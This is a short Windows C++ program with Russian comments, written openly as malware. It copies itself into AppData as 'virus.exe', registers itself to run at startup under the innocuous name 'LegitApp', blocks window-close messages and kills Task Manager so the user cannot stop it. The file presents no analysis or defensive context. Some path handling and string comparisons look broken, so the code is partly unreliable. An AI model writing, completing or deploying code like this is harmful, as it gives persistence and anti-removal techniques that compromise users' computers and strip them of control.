#include <windows.h>
#include <fstream>
#include <tlhelp32.h>

// Самокопирование в папку %AppData%
void replicate() {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::ifstream self(selfPath, std::ios::binary);
    std::ofstream copy("C:\\Users\\%USERNAME%\\AppData\\Roaming\\virus.exe", std::ios::binary);
    copy << self.rdbuf();
}

// Блокировка закрытия через перехват оконных сообщений
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_CLOSE) {
        return 0; // Игнорировать закрытие
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Добавление в автозагрузку
void addToStartup() {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "LegitApp", 0, REG_SZ, (BYTE*)"C:\\Users\\%USERNAME%\\AppData\\Roaming\\virus.exe", 50);
    RegCloseKey(hKey);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    replicate();
    addToStartup();

    // Создание невидимого окна для блокировки закрытия
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "GhostWindow";
    RegisterClass(&wc);
    HWND hwnd = CreateWindow("GhostWindow", NULL, 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);

    // Убийство Диспетчера задач (опасно!)
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        do {
            if (wcscmp(entry.szExeFile, L"Taskmgr.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}